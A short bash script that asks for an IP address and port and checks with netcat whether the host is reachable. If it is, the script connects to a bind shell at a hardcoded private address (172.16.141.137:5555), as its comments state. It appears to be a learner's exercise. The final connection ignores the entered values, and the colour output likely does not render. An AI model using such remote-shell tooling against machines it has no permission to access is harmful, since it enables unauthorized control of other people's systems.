#! /bin/bash
echo "Enter the IP address of the remote device: " 
read ip_address

echo "Enter port number: " 
read port

#The purpose is to check if the client is connected using netcat.
if ( nc -zv $ip_address $port 2>&1 >/dev/null ); then #If he's connected the print "Client is Online" will apear and we will connect the remote machine using bind shell.
    green='\033[0;32m'
    clear='\033[0m'
    echo " ${green}Client is Online, trying to connect... ${clear} "
    sleep 2s #Pauses the script for 2 seconds. 
    nc -nv 172.16.141.137 5555
else #If he's not connected, the print "Client is Offline" will apear and the script will stop.
    red='\033[0;31m'
    clear='\033[0m' # No Color
    echo " ${red}Client is Offline ${clear} "
fi